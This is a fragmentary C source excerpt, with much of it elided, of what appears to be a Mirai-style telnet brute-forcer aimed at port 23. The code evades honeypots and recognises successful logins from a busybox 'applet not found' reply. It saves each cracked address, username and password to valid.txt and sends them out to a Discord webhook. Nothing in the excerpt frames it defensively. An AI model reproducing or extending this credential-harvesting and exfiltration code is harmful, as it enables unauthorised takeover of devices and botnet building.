            ...
            else if(events[i].events & (EPOLLIN | EPOLLET))
            {
                ...
                case BR_WAITING_TOKEN_RESP:
                    ...
                    else if(check_honeypot(brute))
                    {
                        ...
                        char desc_hp[512];
                        snprintf(desc_hp, sizeof(desc_hp), "Address: %s:23\nUsername: %s\nPassword: %s", brute->address, brute->auth->username, brute->auth->password);
                        send_discord_notification("Honeypot Detected", desc_hp, 15548997 /* 0xED4245 */, "honeypots.txt");
                    ...
                    else if(strstr(brute->rdbuf, "applet not found"))
                    {
                        ...
                        write_to_file(brute, "valid.txt");
                        char desc_ok[512];
                        snprintf(desc_ok, sizeof(desc_ok), "Address: %s:23\nUsername: %s\nPassword: %s", brute->address, brute->auth->username, brute->auth->password);
                        send_discord_notification("Valid Telnet Credentials", desc_ok, 5763719 /* 0x57F287 */, "valid.txt");
                        ATOMIC_INC(&found);
                        disconnect(brute);
                        last_found = 0;
                        break;
...
int main(int argc, char **argv)
{
    ...
    tport = htons(23);
    // Load .env once early so webhook.c can read DISCORD_WEBHOOK_URL fallback
